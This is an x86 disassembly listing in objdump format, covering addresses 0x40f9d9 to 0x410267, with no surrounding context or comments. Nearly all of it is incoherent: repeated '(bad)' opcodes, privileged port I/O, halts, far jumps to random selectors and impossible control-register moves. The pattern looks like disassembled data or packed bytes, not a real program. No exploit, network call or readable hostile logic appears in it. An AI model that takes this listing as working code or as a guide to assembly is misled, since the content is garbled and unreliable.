  40f9d9:	ret    
  40f9da:	cmp    cl,cl
  40f9dc:	dec    esp
  40f9dd:	sti    
  40f9de:	adc    DWORD PTR [eax],eax
  40f9e0:	mov    WORD PTR [esi+0x4b],ss
  40f9e3:	imul   ecx,DWORD PTR [ebx+ecx*1-0x6b7b8b73],0xed189917
  40f9ee:	push   ss
  40f9ef:	fwait
  40f9f0:	sub    DWORD PTR [esi+0x1e],ebx
  40f9f3:	test   BYTE PTR [edx+0x219b1767],al
  40f9f9:	pop    esi
  40f9fa:	push   cs
  40f9fb:	test   BYTE PTR [edx+0x67],dh
  40f9fe:	repz add DWORD PTR [eax],0x0
	...
  40fa12:	add    BYTE PTR [eax],al
  40fa14:	loopne 0x40f9b2
  40fa16:	pop    es
  40fa17:	cli    
  40fa18:	xlat   BYTE PTR ds:[ebx]
  40fa19:	in     eax,dx
  40fa1a:	out    0xb9,al
  40fa1c:	dec    ebp
  40fa1d:	cwde   
  40fa1e:	(bad)  
  40fa20:	push   es
  40fa21:	add    BYTE PTR [ebx+0x48],ah
  40fa24:	inc    edi
  40fa25:	jp     0x40fa06
  40fa27:	in     eax,dx
  40fa28:	iret   
  40fa29:	in     eax,dx
  40fa2a:	pop    esp
  40fa2b:	or     al,0x24
  40fa2d:	aas    
  40fa2e:	cmp    eax,DWORD PTR [ebx-0x7fd2e4ce]
  40fa34:	mov    bl,0x94
  40fa36:	fbstp  TBYTE PTR [edx-0x1f]
  40fa39:	jnp    0x40fa92
  40fa3b:	jmp    0x40fa09
  40fa3d:	xchg   esp,eax
  40fa3e:	pop    ss
  40fa3f:	xchg   ecx,eax
  40fa40:	stos   BYTE PTR es:[edi],al
  40fa41:	push   ebx
  40fa42:	fild   WORD PTR [edx-0x63786380]
  40fa48:	jp     0x40fa37
  40fa4a:	xchg   BYTE PTR [ebx-0x6710f80],al
  40fa50:	mov    edi,esp
  40fa52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa53:	iret   
  40fa54:	jmp    0x1c94:0x8f46a8ec
  40fa5b:	(bad)  
  40fa5c:	out    0x10,eax
  40fa5e:	and    al,0x7c
  40fa60:	imul   edx,DWORD PTR [edi+ebx*8-0x2b12f68e],0xb
  40fa68:	mov    ah,0xf9
  40fa6a:	test   eax,0xb4ecba82
  40fa6f:	btr    DWORD PTR [esi-0x9],esp
  40fa73:	imul   ecx,DWORD PTR [ecx+ebx*2+0x8],0x36
	...
  40fa8c:	pmaxsw mm7,QWORD PTR [ebx-0x27]
  40fa90:	push   cs
  40fa91:	push   0x59561100
  40fa96:	cmc    
  40fa97:	push   ds
  40fa98:	punpcklwd mm2,DWORD PTR [eax]
  40fa9b:	push   ss
  40fa9c:	test   DWORD PTR [eax-0x3786b0b],ecx
  40faa2:	hlt    
  40faa3:	mov    bl,0xe
  40faa5:	jmp    0x40fb07
  40faa7:	push   ss
  40faa8:	ja     0x40faff
  40faaa:	or     dh,dh
  40faac:	fs pushf 
  40faae:	loopne 0x40fb1d
  40fab0:	cdq    
  40fab1:	xchg   esp,eax
  40fab2:	or     dl,dh
  40fab4:	iret   
  40fab5:	pusha  
  40fab6:	imul   edx,DWORD PTR [ecx-0x17],0x72
  40faba:	inc    edi
  40fabb:	jmp    0xe971d677
  40fac0:	(bad)  
  40fac1:	sbb    eax,0xcd27c14c
  40fac6:	ins    DWORD PTR es:[edi],dx
  40fac7:	sub    BYTE PTR [eax-0x48268415],dl
  40facd:	dec    ecx
  40face:	xor    ch,cl
  40fad0:	(bad)  
  40fad1:	lahf   
  40fad2:	enter  0x861d,0x97
  40fad6:	dec    ebx
  40fad7:	mov    eax,ds:0x96185118
  40fadc:	add    al,0x9c
  40fade:	loopne 0x40faae
  40fae0:	jmp    0x7cea:0x776af5ea
  40fae7:	mov    ch,0x18
  40fae9:	push   ecx
  40faea:	hlt    
  40faeb:	add    DWORD PTR [ecx+0x2fe594],ecx
	...
  40fb01:	add    BYTE PTR [eax],al
  40fb03:	add    BYTE PTR [esi],cl
  40fb05:	popa   
  40fb06:	add    BYTE PTR [ecx-0x25],dl
  40fb09:	pop    ebp
  40fb0a:	cmc    
  40fb0b:	pop    esi
  40fb0c:	push   cs
  40fb0d:	popa   
  40fb0e:	add    al,0x56
  40fb10:	les    edx,FWORD PTR [ebx-0x1536dd20]
  40fb16:	cmc    
  40fb17:	add    BYTE PTR [edx-0x14],cl
  40fb1a:	icebp  
  40fb1b:	jmp    eax
  40fb1d:	lahf   
  40fb1e:	loopne 0x40fb7e
  40fb20:	out    dx,eax
  40fb21:	push   ss
  40fb22:	idiv   edi
  40fb24:	loopne 0x40fab5
  40fb26:	cmc    
  40fb27:	jne    0x40faba
  40fb29:	push   ss
  40fb2a:	jge    0x40fb34
  40fb2c:	popf   
  40fb2d:	sbb    eax,0x589aff40
  40fb32:	(bad)  
  40fb33:	adc    al,0x65
  40fb35:	int3   
  40fb36:	sub    ah,0xe6
  40fb39:	push   ebx
  40fb3a:	std    
  40fb3b:	push   esi
  40fb3c:	not    BYTE PTR [edi+ebp*2+0x4b]
  40fb40:	xor    al,0x97
  40fb42:	or     BYTE PTR [ecx+ebp*8+0x12],dh
  40fb46:	xor    eax,0xf5d79e75
  40fb4b:	jmp    ecx
  40fb4d:	loope  0x40fad9
  40fb4f:	cmp    eax,0x48d908
  40fb54:	and    eax,0x60c75fe3
  40fb59:	adc    al,0xf6
  40fb5b:	push   DWORD PTR ds:0xdd45cd97
  40fb61:	(bad)
  40fb65:	sbb    cl,BYTE PTR [ebp-0x4]
	...
  40fb7c:	push   ebp
  40fb7d:	sbb    ecx,DWORD PTR [ebp-0x8]
  40fb80:	(bad)  
  40fb83:	addr16 push edi
  40fb85:	std    
  40fb86:	dec    eax
  40fb87:	add    BYTE PTR [edx],cl
  40fb89:	cmp    DWORD PTR [ebx+0x4b],0xffffffa4
  40fb8d:	nop
  40fb8e:	add    eax,eax
  40fb90:	loope  0x40fb61
  40fb92:	mov    bh,BYTE PTR [ebp+0x5d]
  40fb95:	nop
  40fb96:	jl     0x40fbd5
  40fb98:	data16 jmp 0x40fb8c
  40fb9b:	add    BYTE PTR [ecx+0x697581ab],dh
  40fba1:	jns    0x40fbb6
  40fba3:	push   esi
  40fba4:	mov    WORD PTR [esi+0x32],?
  40fba7:	inc    DWORD PTR [edx-0x1b]
  40fbaa:	mov    BYTE PTR [ebp-0x70],dh
  40fbad:	push   edx
  40fbae:	repnz pop es
  40fbb0:	stos   DWORD PTR es:[edi],eax
  40fbb1:	and    bh,BYTE PTR [edx]
  40fbb3:	call   FWORD PTR [ecx]
  40fbb5:	cmc    
  40fbb6:	popa   
  40fbb7:	fstp   QWORD PTR [edx-0x6ca27847]
  40fbbd:	pop    ds
  40fbbe:	jb     0x40fb42
  40fbc0:	push   edx
  40fbc1:	lock mov WORD PTR [esp+eax*4-0x4],?
  40fbc6:	std    
  40fbc7:	add    al,0xf
  40fbc9:	fimul  DWORD PTR [ecx]
  40fbcb:	jne    0x40fc28
  40fbcd:	xchg   ebx,eax
  40fbce:	std    
  40fbcf:	sti    
  40fbd0:	imul   eax,ecx,0xfffffff2
  40fbd3:	dec    edx
  40fbd4:	int    0xfb
  40fbd6:	out    0xc8,eax
  40fbd8:	dec    esi
  40fbd9:	lock or DWORD PTR [ebp+0x7],edx
  40fbdd:	ror    BYTE PTR [ebx+eax*8+0x0],0x0
	...
  40fbf1:	add    BYTE PTR [eax],al
  40fbf3:	add    BYTE PTR [eax-0x51],al
  40fbf6:	aas    
  40fbf7:	inc    esp
  40fbf8:	inc    esp
  40fbf9:	cld    
  40fbfa:	or     DWORD PTR [eax],eax
  40fbfc:	mov    WORD PTR [edx],?
  40fbfe:	iret   
  40fbff:	repz mov ebx,?
  40fc02:	or     DWORD PTR [eax],eax
  40fc04:	sub    esp,DWORD PTR [ecx+0x1fc98f1c]
  40fc0a:	pop    ebx
  40fc0b:	ins    BYTE PTR es:[edi],dx
  40fc0c:	sbb    BYTE PTR [esi+0xc],dl
  40fc0f:	push   0xffffff8c
  40fc11:	test   DWORD PTR [edx+ebp*2],ecx
  40fc14:	mov    WORD PTR [edx],cs
  40fc16:	(bad)  
  40fc17:	sti    
  40fc18:	add    ecx,DWORD PTR [ecx-0x6a7395e8]
  40fc1e:	or     al,0xe8
  40fc20:	xchg   ecx,eax
  40fc21:	ror    DWORD PTR [ecx],cl
  40fc23:	add    BYTE PTR [edi+0x3c34fe3b],dl
  40fc29:	mov    esp,DWORD PTR [eax+eiz*8+0x48]
  40fc2d:	jp     0x40fbb7
  40fc2f:	mov    BYTE PTR [ecx-0x6c],cl
  40fc32:	fidiv  DWORD PTR [di]
  40fc35:	xchg   esp,eax
  40fc36:	fld    DWORD PTR [ebx]
  40fc38:	pop    ebp
  40fc39:	jmp    0x5ffb7812
  40fc3e:	inc    ebx
  40fc3f:	cmp    BYTE PTR [eax],0x98
  40fc42:	fld    DWORD PTR [ebx]
  40fc44:	ss xchg esp,eax
  40fc46:	push   edi
  40fc47:	js     0x40fca3
  40fc49:	xchg   esp,eax
  40fc4a:	fisttp WORD PTR [esp+ecx*8]
  40fc4d:	pop    edi
  40fc4e:	(bad)  
  40fc4f:	sbb    BYTE PTR [eax],0xec
  40fc52:	pop    ss
  40fc53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc54:	xlat   BYTE PTR ds:[ebx]
  40fc55:	jmp    0x414470
	...
  40fc6a:	add    BYTE PTR [eax],al
  40fc6c:	enter  0xdfec,0x3
  40fc70:	mov    WORD PTR [edx+eiz*2+0x73947bfe],ss
  40fc77:	shr    DWORD PTR [edx+0x5f],1
  40fc7a:	test   DWORD PTR [eax-0x7ff81328],0xcdf94a3
  40fc84:	dec    esp
  40fc85:	pusha  
  40fc86:	cs aam 0x4a
  40fc89:	pop    edi
  40fc8a:	imul   DWORD PTR [ebx-0x21]
  40fc8d:	mov    eax,ds:0x95d503df
  40fc92:	mov    al,ds:0x19fd5b8b
  40fc97:	test   BYTE PTR [ebx-0x69],ah
  40fc9a:	cmp    al,0x28
  40fc9c:	dec    edx
  40fc9d:	xchg   esp,eax
  40fc9e:	(bad)  
  40fca0:	xor    ebp,DWORD PTR [ecx-0x6273fc02]
  40fca6:	lahf   
  40fca7:	clc    
  40fca8:	mov    al,ds:0x786c2f44
  40fcad:	pop    eax
  40fcae:	sahf   
  40fcaf:	jg     0x40fcb5
  40fcb1:	dec    edi
  40fcb2:	fstp   QWORD PTR [ecx+ebp*8-0xc]
  40fcb7:	ja     0x40fcf7
  40fcb9:	cld    
  40fcba:	push   ebp
  40fcbb:	shl    dl,1
  40fcbd:	call   0x54d37eca
  40fcc2:	mov    BYTE PTR [ecx+0x66d75f8f],dh
  40fcc8:	(bad)
  40fccb:	test   eax,0x62f5e9d3
	...
  40fce4:	(bad)
  40fce7:	and    BYTE PTR [esi-0x63],cl
  40fcea:	or     BYTE PTR [esi+edx*1+0x442589fd],bl
  40fcf1:	aas    
  40fcf2:	pop    ebp
  40fcf3:	push   0x4d
  40fcf5:	aaa    
  40fcf6:	inc    edx
  40fcf7:	test   al,0x8f
  40fcf9:	xchg   esp,eax
  40fcfa:	jnp    0x40fceb
  40fcfc:	push   0x4a
  40fcfe:	mov    edi,0x83949c2b
  40fd03:	lods   al,BYTE PTR ds:[esi]
  40fd04:	call   DWORD PTR [edi-0xb]
  40fd07:	xchg   esp,eax
  40fd08:	cmp    esp,0xffffffaf
  40fd0b:	cwde   
  40fd0c:	jmp    0x2410:0x932901e6
  40fd13:	call   0x6cc891a7
  40fd18:	shl    edi,cl
  40fd1a:	cmc    
  40fd1b:	stc    
  40fd1c:	(bad)  
  40fd1d:	xchg   edi,eax
  40fd1e:	mov    esi,esi
  40fd20:	mov    BYTE PTR [eax+ecx*1-0xa13cb2a],dl
  40fd27:	push   esp
  40fd28:	mov    al,0xef
  40fd2a:	dec    esp
  40fd2b:	sbb    al,0xab
  40fd2d:	out    0x1,al
  40fd2f:	test   eax,0xe80d1192
  40fd34:	(bad)  
  40fd35:	xchg   esp,eax
  40fd36:	cmc    
  40fd37:	xor    al,0xc
  40fd39:	out    0x7b,eax
  40fd3b:	mov    eax,ds:0x286e2af7
  40fd40:	mov    ah,bh
  40fd42:	fst    DWORD PTR [edi+0x247fe67a]
	...
  40fd5c:	jl     0x40fd44
  40fd5e:	jnp    0x40fd60
  40fd60:	adc    DWORD PTR [edi+0x7c],esp
  40fd63:	clc    
  40fd64:	jge    0x40fd8a
  40fd66:	outs   dx,DWORD PTR ds:[esi]
  40fd67:	inc    ecx
  40fd68:	in     eax,0x7b
  40fd6a:	mov    ch,0xfe
  40fd6c:	bound  esp,QWORD PTR [esi-0x80]
  40fd6f:	inc    ebp
  40fd70:	pop    ebp
  40fd71:	data16 jl 0x40fd70
  40fd74:	(bad)  
  40fd75:	in     al,dx
  40fd76:	std    
  40fd77:	push   0x48ee6a
  40fd7c:	dec    ebp
  40fd7d:	and    al,0xf4
  40fd7f:	call   DWORD PTR [edx+0x18]
  40fd82:	dec    ebp
  40fd83:	in     al,0x36
  40fd85:	xchg   esp,eax
  40fd86:	in     al,0x0
  40fd88:	mov    dl,0xf
  40fd8a:	mov    eax,ds:0x8993a500
  40fd8f:	jge    0x40fd2e
  40fd91:	xchg   ebx,eax
  40fd92:	add    eax,0x8940284
  40fd97:	add    dh,ah
  40fd99:	xchg   esp,eax
  40fd9a:	in     al,dx
  40fd9b:	add    BYTE PTR [edx+0xf],dl
  40fd9e:	popf   
  40fd9f:	add    BYTE PTR [ebp-0x6d],dh
  40fda2:	cmc    
  40fda3:	jne    0x40fe22
  40fda5:	jnp    0x40fe10
  40fda7:	ss gs xchg ebx,eax
  40fdaa:	xor    DWORD PTR [ebp-0x73],0xfd8bf41a
  40fdb1:	inc    edx
  40fdb2:	loopne 0x40fe05
  40fdb4:	pop    esi
  40fdb5:	mov    dh,0x6e
  40fdb7:	lods   eax,DWORD PTR ds:[esi]
  40fdb8:	mov    eax,ds:0x81087aa0
  40fdbd:	stos   DWORD PTR es:[edi],eax
  40fdbe:	jge    0x40fdc4
	...
  40fdd4:	and    DWORD PTR [eax-0x2c6efb1f],0x14a50a09
  40fdde:	es jb  0x40fe10
  40fde1:	adc    esi,edx
  40fde3:	cmp    DWORD PTR [edx-0x1a137771],ebp
  40fde9:	jnp    0x40fdf6
  40fdeb:	or     BYTE PTR [ecx+edx*1-0xd378036],0x49
  40fdf3:	fist   WORD PTR [eax+0x55a94de3]
  40fdf9:	loop   0x40fe3d
  40fdfb:	je     0x40fdc7
  40fdfd:	add    DWORD PTR [ecx-0x28a4fb4],0xffffffe7
  40fe04:	sbb    edi,DWORD PTR [eax]
  40fe06:	push   0xffffffc6
  40fe08:	dec    ecx
  40fe09:	push   ebp
  40fe0a:	or     al,0x0
  40fe0c:	mov    ebp,?
  40fe0e:	xchg   BYTE PTR [eax+ebx*8+0x2c],al
  40fe12:	loopne 0x40fe14
  40fe14:	ss std 
  40fe16:	(bad)  
  40fe18:	xor    eax,0x8ffdffd
  40fe1d:	cmp    BYTE PTR [esi+0x4f],dl
  40fe20:	xchg   ebx,eax
  40fe21:	mov    edi,0xfbcd4aa6
  40fe26:	add    al,al
  40fe28:	clc    
  40fe29:	(bad)  [eax-0x203ab84]
  40fe2f:	sbb    esi,DWORD PTR [ebx+0x1]
  40fe32:	pop    esi
  40fe33:	(bad)  
  40fe34:	loope  0x40fde9
  40fe36:	jae    0x40feac
	...
  40fe4c:	push   0x5bebfee7
  40fe51:	imul   eax,DWORD PTR [ecx],0x74f811e8
  40fe57:	dec    BYTE PTR [ebx+0x49]
  40fe5a:	push   esp
  40fe5b:	out    0x35,eax
  40fe5d:	or     DWORD PTR [eax+eax*1],0xe778493b
  40fe64:	xor    eax,0x2bfe73b2
  40fe69:	test   eax,0xa21de764
  40fe6e:	jae    0x40fe6e
  40fe70:	sbb    ebp,DWORD PTR [ecx-0x4dda18a0]
  40fe76:	jae    0x40fe76
  40fe78:	sbb    DWORD PTR [ebp-0x3ac8bdc],edx
  40fe7e:	pop    es
  40fe7f:	sar    edx,cl
  40fe81:	in     eax,0x3e
  40fe83:	faddp  st(4),st
  40fe85:	rcl    bl,cl
  40fe87:	add    eax,DWORD PTR [ecx+0x19]
  40fe8a:	pushf  
  40fe8b:	or     bh,0xe8
  40fe8e:	sbb    DWORD PTR [esi+eiz*2],eax
  40fe91:	dec    edi
  40fe92:	jle    0x40fe8a
  40fe94:	mov    edi,esp
  40fe96:	(bad)  
  40fe98:	retf   0x78e5
  40fe9b:	mov    bh,0xe5
  40fe9e:	fmul   QWORD PTR [ebx]
  40fea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea1:	mov    dl,0x5c
  40fea3:	jl     0x40fe57
  40fea5:	jp     0x40fe93
  40fea7:	imul   ebx,DWORD PTR [ecx-0x6983b1ab],0xffffffd4
  40feae:	mov    ebx,0x1d
	...
  40fec3:	add    BYTE PTR [esp+edi*2],bh
  40fec6:	(bad)  
  40fec7:	dec    edi
  40fec8:	push   ebx
  40fec9:	xchg   esp,eax
  40feca:	mov    DWORD PTR [ebx],0xeb6df58c
  40fed0:	and    BYTE PTR [ebp-0x60],ch
  40fed3:	add    ebx,esp
  40fed5:	in     eax,0x94
  40fed7:	or     esp,DWORD PTR [esp+esi*8-0x70]
  40fedb:	jl     0x40ff47
  40fedd:	cld    
  40fede:	push   ebx
  40fedf:	leave  
  40fee0:	(bad)  
  40fee1:	in     eax,0xf6
  40fee3:	cmc    
  40fee4:	push   edi
  40fee5:	in     eax,0x74
  40fee7:	or     esp,DWORD PTR [ebp+ecx*4-0x59]
  40feeb:	jl     0x40ff37
  40feed:	(bad)  [ecx+0x7a3f8c00]
  40fef3:	push   0xd3dbd00e
  40fef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef9:	xchg   esp,eax
  40fefa:	dec    ecx
  40fefb:	ret    0x5f2a
  40fefe:	imul   DWORD PTR [ebx-0xb]
  40ff01:	dec    esp
  40ff02:	mov    dh,0x7b
  40ff04:	add    al,0x4f
  40ff06:	or     BYTE PTR [ebp+0x215da803],dh
  40ff0c:	shl    esp,1
  40ff0e:	jne    0x40fef6
  40ff10:	(bad)  
  40ff11:	pusha  
  40ff12:	push   edi
  40ff13:	adc    DWORD PTR [edx+0x6e],ebp
  40ff16:	inc    edi
  40ff17:	jmp    0xd804ebfa
  40ff1c:	(bad)  
  40ff1d:	xchg   esp,eax
  40ff1e:	add    DWORD PTR [ecx-0x111e6d24],ebp
  40ff24:	out    0xf2,eax
  40ff26:	ins    DWORD PTR es:[edi],dx
  40ff27:	sub    BYTE PTR [eax],al
	...
  40ff39:	add    BYTE PTR [eax],al
  40ff3b:	add    BYTE PTR [eax+0x7e2de03d],cl
  40ff41:	xchg   esp,eax
  40ff42:	or     dl,dh
  40ff44:	dec    edi
  40ff45:	popa   
  40ff46:	sub    DWORD PTR [esi+0x565c9527],esi
  40ff4c:	aaa    
  40ff4d:	call   0xe960:0x4488d5c8
  40ff54:	(bad)  
  40ff55:	cmc    
  40ff56:	mov    dh,0xd1
  40ff58:	and    BYTE PTR [esi+0x47],ch
  40ff5b:	jmp    0xe1bce51f
  40ff60:	test   DWORD PTR [ebx-0x3f8d987],0xe2f6b327
  40ff6a:	hlt    
  40ff6b:	fcmove st,st(7)
  40ff6d:	sbb    al,0xf6
  40ff6f:	push   cs
  40ff70:	out    0xe2,eax
  40ff72:	cli    
  40ff73:	push   edi
  40ff74:	mov    al,ds:0xd74e7b9b
  40ff79:	push   0x9c5cf6f4
  40ff7e:	loopne 0x40ffe7
  40ff80:	dec    edi
  40ff81:	jecxz  0x40ff78
  40ff83:	inc    esi
  40ff84:	rcl    ebp,1
  40ff86:	or     al,0xe9
  40ff88:	pop    esp
  40ff89:	pmulhw mm5,QWORD PTR [eax+0x73]
  40ff8d:	sar    ebp,cl
  40ff8f:	into   
  40ff90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff91:	adc    BYTE PTR [eax+eax*1+0x49],cl
  40ff95:	enter  0x75f6,0x35
  40ff99:	pop    edi
  40ff9a:	jl     0x40ffa8
  40ff9c:	dec    ebp
  40ff9d:	jge    0x40ffdd
	...
  40ffb3:	add    ch,dh
  40ffb5:	xchg   edx,eax
  40ffb6:	enter  0x700f,0xa4
  40ffba:	or     al,BYTE PTR [eax]
  40ffbc:	in     eax,0x56
  40ffbe:	dec    esp
  40ffbf:	clc    
  40ffc0:	in     eax,0x97
  40ffc2:	or     BYTE PTR [eax],al
  40ffc4:	xor    dl,ch
  40ffc6:	in     eax,0xff
  40ffc8:	repnz xchg edi,eax
  40ffca:	or     BYTE PTR [edx-0x1b],ch
  40ffcd:	icebp  
  40ffce:	cmc    
  40ffcf:	imul   esp,ebp,0x708cf5f1
  40ffd5:	push   0x67308d45
  40ffda:	(bad)  
  40ffdb:	call   FWORD PTR [edx-0x39]
  40ffde:	div    BYTE PTR [ebp+0x5d]
  40ffe1:	pop    esi
  40ffe2:	jl     0x40ffe0
  40ffe4:	dec    ebp
  40ffe5:	outs   dx,BYTE PTR ds:[esi]
  40ffe6:	cmp    al,0x0
  40ffe8:	mov    ch,0x92
  40ffea:	enter  0xb074,0x70
  40ffee:	std    
  40ffef:	add    DWORD PTR [ebp+0x2daf6097],esp
  40fff5:	fdiv   st,st(5)
  40fff7:	(bad)  
  40fff8:	and    BYTE PTR [edi+0x5e2840e0],al
  40fffe:	not    BYTE PTR [eax-0x12]
  410001:	inc    edi
  410002:	test   BYTE PTR [ebp-0x9997b],al
  410008:	add    eax,0x2830edc9
  41000d:	pop    esi
  41000e:	test   BYTE PTR [ecx-0x18420],0x3a
  410015:	outs   dx,BYTE PTR ds:[esi]
  410016:	mov    ecx,DWORD PTR [ecx+0x0]
	...
  410029:	add    BYTE PTR [eax],al
  41002b:	add    BYTE PTR [edx],ch
  41002d:	pop    ebp
  41002e:	test   BYTE PTR [ebp+0x61],al
  410031:	enter  0x4f6d,0x8c
  410035:	push   ebp
  410036:	leave  
  410037:	jmp    FWORD PTR [edx]
  410039:	or     BYTE PTR [ecx-0xa],ah
  41003c:	and    ebx,edx
  41003e:	outs   dx,DWORD PTR ds:[esi]
  41003f:	je     0x40ffc9
  410041:	lds    eax,FWORD PTR [edi-0x7dd5ecb5]
  410047:	test   ah,ah
  410049:	sub    DWORD PTR [eax-0x2],esi
  41004c:	jbe    0x41003b
  41004e:	loope  0x4100a7
  410050:	lods   al,BYTE PTR fs:[esi]
  410052:	or     al,0xff
  410054:	cmp    DWORD PTR [ecx],ebx
  410056:	js     0x410056
  410058:	jmp    0x41006b
  41005a:	out    0xb,al
  41005c:	hlt    
  41005d:	mov    al,al
  41005f:	(bad)  
  410060:	(bad)  [ebx+0x75]
  410063:	out    0xdb,eax
  410065:	imul   ebp,DWORD PTR [edi+0x69],0x67eb958c
  41006c:	dec    ebp
  41006d:	in     eax,dx
  41006e:	jo     0x410024
  410070:	test   al,0x49
  410072:	outs   dx,DWORD PTR ds:[esi]
  410073:	(bad)  
  410074:	mov    bl,0xbf
  410076:	or     eax,0x71013de8
  41007b:	(bad)  
  41007c:	adc    eax,0x9bf66870
  410081:	mov    eax,ds:0xa1b8848d
  410086:	outs   dx,DWORD PTR ds:[esi]
  410087:	(bad)  
  410088:	(bad)  
  41008a:	hlt    
  41008b:	addr16 int 0xeb
  41008e:	jo     0x410044
	...
  4100a4:	push   0x73fe6f8b
  4100a9:	add    DWORD PTR [esi],ecx
  4100ab:	call   0xfeb2004d
  4100b0:	xchg   edi,eax
  4100b1:	stos   DWORD PTR es:[edi],eax
  4100b2:	clc    
  4100b3:	sbb    BYTE PTR [edi],cl
  4100b5:	mov    eax,ds:0xeb53f658
  4100ba:	cmc    
  4100bb:	je     0x410059
  4100bd:	repnz cmp DWORD PTR [edi+0x70bf9509],ecx
  4100c4:	cmp    ah,dl
  4100c6:	das    
  4100c7:	ins    BYTE PTR es:[edi],dx
  4100c8:	xor    DWORD PTR [ebp-0x22],ecx
  4100cb:	js     0x410103
  4100cd:	mov    edx,ebp
  4100cf:	inc    ebx
  4100d0:	lahf   
  4100d1:	call   0x78b6:0x4d1d6c0f
  4100d8:	dec    edx
  4100d9:	sbb    al,al
  4100db:	jo     0x4100e7
  4100dd:	loop   0x4100bb
  4100df:	add    ecx,DWORD PTR [esp+edx*4+0x6e640419]
  4100e6:	pop    ss
  4100e7:	ret    
  4100e8:	repz loop 0x41013f
  4100eb:	addr16 loop 0x4100cf
  4100ee:	xchg   BYTE PTR [eax+0x58],bh
  4100f1:	nop
  4100f2:	xchg   edi,eax
  4100f3:	ins    BYTE PTR es:[edi],dx
  4100f4:	inc    esi
  4100f5:	loope  0x41016d
  4100f7:	mov    cl,BYTE PTR [eax]
  4100f9:	shl    DWORD PTR [esi+0x78],0xca
  4100fd:	outs   dx,BYTE PTR ds:[esi]
  4100fe:	fucomip st,st(3)
  410100:	or     DWORD PTR [ebp-0x60],ebp
  410103:	add    edi,DWORD PTR [ebx+0x704427]
	...
  410119:	add    BYTE PTR [eax],al
  41011b:	add    BYTE PTR [edx-0x6811a11f],dh
  410121:	in     al,dx
  410122:	das    
  410123:	int3   
  410124:	mov    ds:0xcb7e78e1,al
  410129:	jmp    0x204f7964
  41012e:	sbb    BYTE PTR [eax-0x76],dh
  410131:	loope  0x410112
  410133:	or     BYTE PTR [eax],cl
  410135:	or     al,ah
  410137:	add    ecx,DWORD PTR [esp+ebp*2-0x6b331490]
  41013e:	ins    BYTE PTR es:[edi],dx
  41013f:	mov    esi,0xae06445f
  410144:	cmp    ebp,ecx
  410146:	push   cs
  410147:	js     0x4101bc
  410149:	xchg   edx,eax
  41014a:	jno    0x4101c4
  41014c:	push   edx
  41014d:	lea    ecx,[eax]
  41014f:	sub    DWORD PTR [ebx],edi
  410151:	pop    ebp
  410152:	mov    DWORD PTR [ebx+esi*4-0x1f],ebp
  410156:	jns    0x4101b7
  410158:	mov    ebp,cr5
  41015b:	(bad)  
  41015c:	mov    ebx,0x355d08e2
  410161:	push   ss
  410162:	mov    ah,0xc1
  410164:	mov    bl,0xe2
  410166:	cmc    
  410167:	jmp    0xd9a17697
  41016c:	(bad)  
  41016d:	icebp  
  41016e:	mov    dh,0xb6
  410170:	std    
  410171:	cwde   
  410172:	loopne 0x410144
  410174:	int3   
  410175:	loope  0x41016c
  410177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410178:	cmp    eax,0x7b9efdf9
  41017d:	loop   0x4101fa
  41017f:	loope  0x410181
	...
  410191:	add    BYTE PTR [eax],al
  410193:	add    BYTE PTR [edi+0x70],dh
  410196:	dec    ebx
  410197:	mov    ds,WORD PTR [ebx-0x1e]
  41019a:	mov    ebx,0xf5e26b8d
  41019f:	jle    0x41017e
  4101a1:	cwde   
  4101a2:	loopne 0x4101ba
  4101a4:	int    0xe1
  4101a6:	cmc    
  4101a7:	outs   dx,BYTE PTR ds:[esi]
  4101a8:	mov    ebp,0x589cf5e4
  4101ad:	jmp    0x4100:0x683b5ef5
  4101b4:	outs   dx,BYTE PTR ds:[esi]
  4101b5:	push   edi
  4101b6:	cmc    
  4101b7:	dec    esi
  4101b8:	sbb    ebp,DWORD PTR [eax]
  4101ba:	jmp    0xf62324fd
  4101bf:	mov    ah,0x87
  4101c1:	in     al,dx
  4101c2:	(bad)  
  4101c3:	lods   eax,DWORD PTR ds:[esi]
  4101c4:	add    bl,bh
  4101c6:	cmc    
  4101c7:	je     0x4101ad
  4101c9:	out    0xf5,al
  4101cb:	add    ebp,DWORD PTR es:[ecx+0x0]
  4101cf:	adc    DWORD PTR [esi-0x1ce90aa7],edi
  4101d5:	sub    cl,bl
  4101d7:	push   ss
  4101d8:	fcmovnu st,st(6)
  4101da:	cmc    
  4101db:	add    al,bl
  4101dd:	mov    esp,eax
  4101df:	and    al,0x28
  4101e1:	addr16 idiv bh
  4101e4:	mov    BYTE PTR [eax-0x2],al
  4101e7:	push   DWORD PTR [edx]
  4101e9:	ins    BYTE PTR es:[edi],dx
  4101ea:	or     ecx,DWORD PTR [eax+0x32]
  4101ed:	div    BYTE PTR [di+0x6f5d]
  4101f2:	idiv   bh
  4101f4:	dec    ebp
  4101f5:	pop    ebx
  4101f6:	dec    esi
  4101f7:	inc    DWORD PTR [eax]
	...
  410209:	add    BYTE PTR [eax],al
  41020b:	add    BYTE PTR [edx+0x67],dl
  41020e:	mov    esp,0xf666dadc
  410213:	call   0x3820ed
  410218:	inc    edx
  410219:	and    eax,0x6732f7ea
  41021e:	in     eax,dx
  41021f:	in     eax,0xaa
  410221:	addr16 idiv bh
  410224:	pop    eax
  410225:	inc    ebx
  410226:	(bad)  
  410227:	inc    DWORD PTR [edx]
  410229:	ins    BYTE PTR es:[edi],dx
  41022a:	iret   
  41022b:	inc    edi
  41022c:	adc    ah,BYTE PTR [edi-0xa]
  41022f:	mov    ch,0x1
  410231:	outs   dx,DWORD PTR ds:[esi]
  410232:	idiv   bh
  410234:	push   edx
  410235:	in     al,0x1
  410237:	dec    eax
  410239:	mov    esp,eax
  41023b:	(bad)  
  41023c:	xor    BYTE PTR [esi-0xa],ah
  41023f:	call   FWORD PTR [eax]
  410241:	js     0x410241
  410243:	call   DWORD PTR [edx+0x6b]
  410246:	mov    bl,0x47
  410248:	inc    edx
  410249:	data16 test BYTE PTR [ebp+0x3d],0x70
  41024e:	iret   
  41024f:	std    
  410250:	push   edx
  410251:	data16 div BYTE PTR [ebp+0x51]
  410255:	imul   ecx,edi,0x33
  410258:	jne    0x4101ed
  41025a:	mov    edi,0x5b9361c2
  41025f:	mov    esp,DWORD PTR [ecx-0x1f1b35ee]
  410265:	aam    0xf1
  410267:	push   eax
